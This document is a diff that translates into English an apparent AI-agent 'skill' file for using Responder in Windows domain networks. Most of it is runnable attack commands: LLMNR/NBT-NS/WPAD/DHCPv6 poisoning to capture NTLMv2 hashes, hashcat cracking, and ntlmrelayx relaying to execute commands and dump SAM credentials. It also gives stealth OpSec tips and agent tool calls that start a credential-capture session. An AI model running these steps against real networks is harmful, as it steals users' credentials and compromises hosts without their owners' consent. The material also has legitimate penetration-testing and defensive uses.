@@ -1,195 +1,197 @@
 ---
 name: responder-poison
-description: "使用 Responder 进行 LLMNR/NBT-NS/MDNS 投毒和 NTLMv2 哈希捕获。当处于 Windows 域网络中、需要被动捕获凭据或进行中间人攻击时使用。Responder 监听网络中的名称解析广播请求（LLMNR/NBT-NS/MDNS），伪造响应诱使目标发送 NTLMv2 认证哈希。抓到的哈希可用 hashcat 离线破解或通过 ntlmrelayx 中继到其他服务。涉及 LLMNR 投毒、NBT-NS 投毒、WPAD 代理、NTLMv2 捕获、中间人攻击的场景使用此技能"
+description: "Use Responder for LLMNR/NBT-NS/MDNS poisoning and NTLMv2 hash capture. Use when operating inside a Windows domain network and you need to passively capture credentials or perform a man-in-the-middle attack. Responder listens for name resolution broadcast requests on the network (LLMNR/NBT-NS/MDNS) and spoofs responses to trick targets into sending NTLMv2 authentication hashes. Captured hashes can be cracked offline with hashcat or relayed to other services with ntlmrelayx. Use this skill for LLMNR poisoning, NBT-NS poisoning, WPAD proxy, NTLMv2 capture, and man-in-the-middle attack scenarios"
+zh-signals: "使用 Responder 通过 LLMNR/NBT-NS/MDNS 投毒被动捕获 NTLMv2 哈希并支持离线破解或中继。信号:Responder,LLMNR 投毒,NTLMv2 捕获,ntlmrelayx,凭据窃取"
+when-to-use: "Use when operating inside a Windows domain network and you need to passively capture NTLMv2 hashes via LLMNR/NBT-NS/mDNS poisoning or relay credentials with ntlmrelayx."
 metadata:
-  tags: "responder,llmnr,nbt-ns,mdns,ntlm,ntlmv2,poison,投毒,中间人,wpad,hash,凭据捕获"
+  tags: "responder,llmnr,nbt-ns,mdns,ntlm,ntlmv2,poison,poisoning,man-in-the-middle,wpad,hash,credential capture"
   category: "tool"
 ---
 
-# Responder LLMNR/NBT-NS 投毒
+# Responder LLMNR/NBT-NS Poisoning
 
-Responder 利用 Windows 名称解析的设计特性——当 DNS 查询失败时，Windows 会通过 LLMNR/NBT-NS 广播询问，Responder 伪造响应让目标把 NTLMv2 哈希发给你。**被动等待即可获取凭据，无需主动攻击。**
+Responder exploits a Windows name resolution design quirk — when a DNS query fails, Windows asks over LLMNR/NBT-NS broadcast, and Responder spoofs the response so the target sends you its NTLMv2 hash. **You simply wait passively to obtain credentials, no active attack required.**
 
-项目地址：https://github.com/lgandx/Responder
+Project URL: https://github.com/lgandx/Responder
 
-## 工作原理
+## How It Works
 
-**Windows 名称解析链**（Responder 利用第 4-6 步）:
-
-```
-1. 本地 hosts 文件
-2. DNS 缓存
-3. DNS 服务器查询
-4. LLMNR (UDP 5355) — 链路本地多播
-5. NBT-NS (UDP 137) — NetBIOS 广播
-6. mDNS  (UDP 5353) — 多播 DNS
-↓ DNS 查不到时，Windows 自动走 4-6 步广播/多播
-↓ Responder 伪造 4-6 步的响应 → 目标发送 NTLMv2 认证
-```
+**Windows name resolution chain** (Responder abuses steps 4-6):
 
 ```
-1. 目标访问不存在的共享 \\FILESERVER\share
-2. DNS 查不到 FILESERVER
-3. Windows 通过 LLMNR/NBT-NS 广播 "谁是 FILESERVER？"
-4. Responder 响应 "我是！"
-5. 目标向 Responder 发送 NTLMv2 认证
-6. Responder 记录哈希
+1. Local hosts file
+2. DNS cache
+3. DNS server query
+4. LLMNR (UDP 5355) — link-local multicast
+5. NBT-NS (UDP 137) — NetBIOS broadcast
+6. mDNS  (UDP 5353) — multicast DNS
+↓ When DNS fails, Windows automatically falls through to the broadcast/multicast steps 4-6
+↓ Responder spoofs the responses for steps 4-6 → the target sends NTLMv2 authentication
 ```
 
-**常见触发场景**:
+```
+1. The target accesses a non-existent share \\FILESERVER\share
+2. DNS cannot resolve FILESERVER
+3. Windows broadcasts "Who is FILESERVER?" over LLMNR/NBT-NS
+4. Responder replies "I am!"
+5. The target sends NTLMv2 authentication to Responder
+6. Responder logs the hash
+```
 
-| 类型 | 场景 | 说明 |
+**Common trigger scenarios**:
+
+| Type | Scenario | Description |
 |------|------|------|
-| 被动 | 拼写错误 | 用户输入错误的服务器名 |
-| 被动 | 过期快捷方式 | 指向已下线服务器的 .lnk |
-| 被动 | 错误配置 | 应用配置中的无效主机名 |
-| 被动 | WPAD | 浏览器自动代理发现 |
-| 主动 | .lnk/.scf 文件 | 放置在共享目录中触发 NTLM |
-| 主动 | RPC 强制认证 | PetitPotam/PrinterBug |
+| Passive | Typo | The user types an incorrect server name |
+| Passive | Stale shortcut | A .lnk pointing to a decommissioned server |
+| Passive | Misconfiguration | Invalid hostnames in application configuration |
+| Passive | WPAD | Browser automatic proxy discovery |
+| Active | .lnk/.scf files | Placed in a shared directory to trigger NTLM |
+| Active | RPC forced authentication | PetitPotam/PrinterBug |
 
-## 基本用法
+## Basic Usage
 
 ```bash
-# 启动 Responder（监听指定网卡）
+# Start Responder (listening on a specific interface)
 responder -I eth0
 
-# 详细模式（推荐）
+# Verbose mode (recommended)
 responder -I eth0 -wv
 
-# -w: 启用 WPAD 代理（捕获更多 HTTP 流量的哈希）
-# -v: 详细输出
-# -d: 启用 DHCP 投毒（DHCPv6 场景）
-# -P: 强制 NTLM 认证代理（ProxyAuth）
+# -w: enable the WPAD proxy (capture hashes from more HTTP traffic)
+# -v: verbose output
+# -d: enable DHCP poisoning (DHCPv6 scenarios)
+# -P: force the NTLM authentication proxy (ProxyAuth)
 
-# 只监听不投毒（分析模式，推荐先跑这个确认环境）
+# Listen only, no poisoning (analysis mode, run this first to confirm the environment)
 responder -I eth0 -A
 ```
 
-## 捕获的哈希
+## Captured Hashes
 
-Responder 抓到的哈希保存在日志目录：
+The hashes captured by Responder are stored in the log directory:
 
 ```bash
-# 默认路径
+# Default path
 ls /usr/share/responder/logs/
-# 或
+# or
 ls /opt/Responder/logs/
 
-# 哈希格式（NTLMv2）：
+# Hash format (NTLMv2):
 # user::DOMAIN:challenge:response:blob
-# 可直接喂给 hashcat -m 5600
+# Can be fed directly to hashcat -m 5600
 
-# NTLMv1 哈希（旧系统/降级攻击）：hashcat -m 5500
+# NTLMv1 hashes (legacy systems / downgrade attacks): hashcat -m 5500
 ```
 
-**Responder 数据库**：Responder 会记录已捕获的哈希避免重复，重新捕获时需清理：
+**Responder database**: Responder records captured hashes to avoid duplicates, so clear it when you want to recapture:
 
 ```bash
-# 数据库位置
+# Database location
 ls /usr/share/responder/Responder.db
-# 或 /opt/Responder/Responder.db
+# or /opt/Responder/Responder.db
 
-# 清理数据库（重新捕获所有哈希）
+# Clear the database (recapture all hashes)
 rm /usr/share/responder/Responder.db
 ```
 
-## 配合 hashcat 破解
+## Cracking with hashcat
 
 ```bash
-# 提取所有抓到的 NTLMv2 哈希
+# Extract all captured NTLMv2 hashes
 cat /usr/share/responder/logs/*.txt | sort -u > ntlmv2_hashes.txt
 
-# hashcat 离线破解
+# Crack offline with hashcat
 hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
 
-# -O 优化模式（截断密码长度换速度）
+# -O optimized mode (truncates the password length for speed)
 hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -O
 ```
 
-## 配合 ntlmrelayx 中继
+## Relaying with ntlmrelayx
 
-**中继**比破解更强大——不需要知道明文密码，直接转发认证到其他目标：
+**Relaying** is more powerful than cracking — no plaintext password is needed, the authentication is simply forwarded to another target:
 
 ```bash
-# 终端 1：Responder 关闭 SMB 和 HTTP（让 ntlmrelayx 处理）
-# 编辑配置文件:
-# /etc/responder/Responder.conf 或 /opt/Responder/Responder.conf
+# Terminal 1: Responder with SMB and HTTP disabled (let ntlmrelayx handle them)
+# Edit the configuration file:
+# /etc/responder/Responder.conf or /opt/Responder/Responder.conf
 # [Responder Core]
 # SMB = Off
 # HTTP = Off
 responder -I eth0 -wv
 
-# 终端 2：ntlmrelayx 中继到目标
+# Terminal 2: ntlmrelayx relays to the target
 ntlmrelayx.py -t smb://10.0.0.5 -smb2support
 
-# 中继到多个目标
+# Relay to multiple targets
 ntlmrelayx.py -tf targets.txt -smb2support
 
-# 中继并执行命令
+# Relay and execute a command
 ntlmrelayx.py -t smb://10.0.0.5 -c "whoami" -smb2support
 
-# 中继并导出凭据
+# Relay and dump credentials
 ntlmrelayx.py -t smb://10.0.0.5 -smb2support --sam
 ```
 
-## WPAD 攻击
+## WPAD Attack
 
 ```bash
-# 启用 WPAD（自动代理发现）
+# Enable WPAD (automatic proxy discovery)
 responder -I eth0 -wv
 
-# WPAD 攻击流程：
-# 1. 浏览器广播 "谁是 wpad.corp.local？"
-# 2. Responder 响应 "我是！"
-# 3. 浏览器请求 /wpad.dat 代理配置
-# 4. Responder 返回代理到自身的 PAC 文件
-# 5. 浏览器所有 HTTP 流量经过 Responder 代理
-# 6. 代理要求 NTLM 认证 → 捕获哈希
+# WPAD attack flow:
+# 1. The browser broadcasts "Who is wpad.corp.local?"
+# 2. Responder replies "I am!"
+# 3. The browser requests the /wpad.dat proxy configuration
+# 4. Responder returns a PAC file pointing the proxy at itself
+# 5. All browser HTTP traffic flows through the Responder proxy
+# 6. The proxy demands NTLM authentication → capture the hash
 ```
 
-## DHCPv6 投毒
+## DHCPv6 Poisoning
 
 ```bash
-# Windows 默认优先 IPv6 → Responder 做 DHCPv6 服务器注入攻击者 DNS
+# Windows prefers IPv6 by default → Responder acts as a DHCPv6 server and injects the attacker DNS
 responder -I eth0 -dv
 
-# 配合 mitm6（更强的 IPv6 DNS 投毒）
+# Combine with mitm6 (stronger IPv6 DNS poisoning)
 mitm6 -d corp.local -i eth0
-# 另一终端: ntlmrelayx.py -t ldaps://DC_IP -wh attacker.corp.local
+# In another terminal: ntlmrelayx.py -t ldaps://DC_IP -wh attacker.corp.local
 ```
 
-## OpSec 注意事项
+## OpSec Notes
 
-- **先跑分析模式** `responder -A` 确认环境有 LLMNR/NBT-NS 流量
-- **限制投毒范围**：只在目标子网操作，避免大面积投毒
-- **在业务时间投毒**：用户活跃时触发概率更高
-- **检测指标**：异常 LLMNR/NBT-NS 响应、未知 IP 的认证请求、大量认证失败
-- **Responder.db 管理**：定期检查避免遗漏重复用户的新哈希
+- **Run analysis mode first**: `responder -A` to confirm there is LLMNR/NBT-NS traffic in the environment
+- **Limit the poisoning scope**: operate only within the target subnet to avoid mass poisoning
+- **Poison during business hours**: the trigger probability is higher when users are active
+- **Detection indicators**: anomalous LLMNR/NBT-NS responses, authentication requests from unknown IPs, a large number of authentication failures
+- **Responder.db management**: check it regularly so you do not miss new hashes for duplicate users
 
-## 使用 interactive_session 运行
+## Running with interactive_session
 
-Responder 需要持续监听，适合用 interactive_session：
+Responder requires continuous listening, so interactive_session is a good fit:
 
 ```
-# 启动 Responder
+# Start Responder
 interactive_session(action="start", session_name="responder", command="responder -I eth0 -wv")
 
-# 检查是否抓到哈希
+# Check whether any hashes were captured
 interactive_session(action="read", session_name="responder", wait=5)
 
-# 查看日志文件
+# Inspect the log files
 interactive_session(action="send", session_name="responder_check", command="ls /usr/share/responder/logs/")
 ```
 
-## 决策树
+## Decision Tree
 
 ```
-在域网络中获取凭据：
-├─ 被动等待（安全、隐蔽）→ Responder 投毒
-├─ 抓到 NTLMv2 哈希后：
-│   ├─ 想知道明文密码 → hashcat -m 5600 离线破解
-│   └─ 不需要明文、直接利用 → ntlmrelayx 中继
-├─ 目标 SMB 签名未启用 → ntlmrelayx 中继（最有效）
-├─ 目标 SMB 签名已启用 → 只能破解哈希
-└─ 需要主动触发 → 通过漏洞让目标访问 \\ATTACKER\share
+Obtaining credentials inside a domain network:
+├─ Wait passively (safe, stealthy) → Responder poisoning
+├─ After capturing an NTLMv2 hash:
+│   ├─ You need the plaintext password → crack offline with hashcat -m 5600
+│   └─ You do not need the plaintext, just to exploit it → relay with ntlmrelayx
+├─ Target SMB signing is not enabled → ntlmrelayx relay (most effective)
+├─ Target SMB signing is enabled → you can only crack the hash
+└─ You need to trigger it actively → use a vulnerability to make the target access \\ATTACKER\share
 ```
